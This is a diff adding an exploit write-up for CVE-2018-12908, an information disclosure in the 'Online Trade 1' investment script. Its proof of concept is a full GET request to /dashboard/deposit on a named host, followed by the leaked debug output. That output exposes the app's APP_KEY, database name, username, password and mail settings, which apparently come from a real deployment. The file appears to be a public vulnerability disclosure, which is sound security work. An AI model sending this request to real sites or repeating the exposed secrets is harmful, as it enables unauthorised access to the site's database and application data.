@@ -1,0 +1,62 @@
+# Exploit Title: Online Trade 1 - Information Disclosure
+# Date: 2018-07-03
+# Exploit Author: L0RD
+# Vendor Homepage:
+https://codecanyon.net/item/online-trade-online-forex-and-cryptocurrency-investment-system/21987193?s_rank=14
+# CVE: CVE-2018-12908
+# Version: 1
+# Tested on: Win 10
+=======================================
+# Description :
+Online trading and cryptocurrency investment system 1 allows
+information disclosure by appending /dashboard/deposit.
+The following path contains database credentials and other information
+(username , password , database_name etc).
+
+# POC :
+
+# Request :
+===================
+GET /dashboard/deposit HTTP/1.1
+Host: trade.brynamics.xyz
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0)
+Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+===================
+# Response :
+===================
+HTTP/1.1 405 Method Not Allowed
+Date: Tue, 12 Jun 2018 21:21:45 GMT
+Server: Apache
+X-Powered-By: PHP/7.0.30
+allow: POST
+Cache-Control: no-cache, private
+Content-Type: text/html; charset=UTF-8
+Content-Length: 371161
+
+<td>APP_ENV</td><span class=sf-dump-str title="5
+characters">local</span></td>
+<td>APP_KEY</td><span class=sf-dump-str title="51
+characters">base64:NyL/WHTpZ0IhYKu7hHAzpF/Pvqn7+dD87tgpVvvEZrg=</span></td>
+<td>APP_URL</td><span class=sf-dump-str title="16 characters">
+http://localhost</span></td>
+<td>DB_CONNECTION</td><span class=sf-dump-str title="5
+characters">mysql</span></td>
+<td>DB_HOST</td><span class=sf-dump-str title="9
+characters">127.0.0.1</span></td>
+<td>DB_PORT</td><span class=sf-dump-str title="4
+characters">3306</span></td>
+<td>DB_DATABASE</td><span class=sf-dump-str title="14
+characters">torrpgug_trade</span></td>
+<td>DB_USERNAME</td><span class=sf-dump-str title="15
+characters">torrpgug_p2pguy</span></td>
+<td>DB_PASSWORD</td><span class=sf-dump-str title="15
+characters">undisputed@2017</span></td>
+<td>MAIL_HOST</td><span class=sf-dump-str title="16 characters">
+smtp.mailtrap.io</span></td>
+<td>MAIL_PORT</td><span class=sf-dump-str title="4 characters">2525</span>
+========================================
